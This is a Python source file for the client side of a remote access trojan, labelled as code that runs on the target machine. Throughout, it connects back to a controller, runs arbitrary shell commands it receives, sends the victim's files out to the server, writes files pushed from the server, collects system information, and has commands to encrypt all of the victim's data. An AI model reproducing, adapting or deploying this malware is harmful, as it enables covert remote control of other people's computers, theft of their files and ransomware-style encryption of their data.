1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
# !/usr/bin/python
############################
## Runs on Traget Machine ##
############################
import os
import sys
import time
import socket
import subprocess
from client.core.secure.RAW import RAW
from .config.ClientConfig import ClientConfig


class RAT(RAW, ClientConfig):

    # constructor
    def __init__(self):
        super(RAT, self).__init__()

        self.start()

    # start the service
    def start(self):
        while True:
            try:
                self.init()
                self.connect(self._loop, self._port)
                data = self.receive()
                if data == self.SIG:
                    self.FLAG = True
                    self.send(self._info + os.getcwd() + "> ")
                while self.FLAG:
                    data = self.receive()
                    data.lower()
                    std_output = self.command_manager(data)
                    # Send data to server
                    std_output += "\n" + os.getcwd() + "> "
                    std_output = std_output.decode('gbk').encode('utf-8', 'gb18030')
                    self.send(std_output)
                if data == 'terminate':
                    self.kill()
                    break
            except socket.error as e:
                self.socket_err_manager(e)
                continue

    # bind connection
    def connect(self, ip, port):
        self._sock.connect((ip, port))

    # receive data
    def receive(self):
        data = ''
        pkt = self._sock.recv(self.BUFFER)
        while pkt:
            data += pkt
            if data:
                break
            else:
                pkt = self._sock.revc(self.BUFFER)
        return data

    # send data
    def send(self, cmd):
        self._sock.sendall(cmd)

    # command manager - given data/cmd
    def command_manager(self, cmd):
        # check for quit
        if cmd == 'quit' or cmd == 'terminate':
            self.send('Quitting...')
            sys.exit(0)
        # check for change directory
        elif cmd.startswith('cd '):
            try:
                os.chdir(cmd[3:])
                std = ""
            except OSError as e:
                std = self.os_err_manager(e)
                pass
        # check for download
        elif cmd.startswith('download '):
            std = self.upload(cmd[9:])
        # check for upload
        elif cmd.startswith('upload '):
            std = self.download(cmd[7:])
        # send system info
        elif cmd.startswith('sys_info'):
            std = self.drill_down()
        # encrypt all data
        elif cmd.startswith('encrypt_all'):
            # std = self._raw.handler(data, "ea")
            std = self.aes_handler(cmd, "ea")
        # encrypt data
        elif cmd.startswith('encrypt '):
            std = self.aes_handler(cmd[8:], "e")
        # decrypt all data
        elif cmd.startswith('decrypt_all'):
            std = self.aes_handler(cmd, "da")
        # decrypt data
        elif cmd.startswith('decrypt '):
            std = self.aes_handler(cmd[8:], "d")
        # bind a shell subprocess
        else:
            hooked_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            std = hooked_process.stdout.read() + hooked_process.stderr.read()
        return std

    # os error handler
    @staticmethod
    def os_err_manager(err):
        # No such directory
        if err[0] is 2:
            return str(err)
        # Other errors
        else:
            return str(err)

    # socket error handler
    def socket_err_manager(self, error_type):
        # Connection refused
        if error_type[0] is 61:
            self.stop()
            time.sleep(self.LONG_INTERVAL)
            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
        # Socket is not connected
        if error_type[0] is 57:
            self.stop()
            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
            time.sleep(self.LONG_INTERVAL)
        # Bad file descriptor
        elif error_type[0] is 9:
            self.stop()
            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
            time.sleep(self.LONG_INTERVAL)
        # Broken Pipe
        elif error_type[0] is 32:
            self.stop()
            print("CODE: {0}\nMSG: {1}\n-------".format(error_type[0], error_type[1]))
            time.sleep(self.LONG_INTERVAL)
        else:
            self.stop()
            print("CODE: {0}\nMSG: {1}".format(error_type[0], error_type[1]))
            time.sleep(self.LONG_INTERVAL)

    # stop socket connection
    def stop(self):
        self._sock.close()

    # kill socket connection
    def kill(self):
        self._sock.close()
        del self._sock
        sys.exit()

    # download content from server
    def download(self, fn):
        g = open(fn, 'wb')
        # download file
        fd = self.receive()
        time.sleep(self.MID_INTERVAL)
        g.write(fd)
        g.close()
        # let server know we're done..
        return self.ACK_SIG

    # upload content to server
    def upload(self, fn):
        filename = unicode(fn, "utf8")
        # bgtr = True
        # file transfer
        try:
            f = open(filename, 'rb')
            while 1:
                fd = f.read()
                if fd == '':
                    break
                # begin sending file
                self.send(fd)
            f.close()
        except:
            time.sleep(self.SHORT_INTERVAL)
        # let server know we're done..
        time.sleep(self.MID_INTERVAL)
        self.send("")
        time.sleep(self.MID_INTERVAL)
        return self.ACK_SIG


def main():
    rat = RAT()


if __name__ == '__main__':
    main()
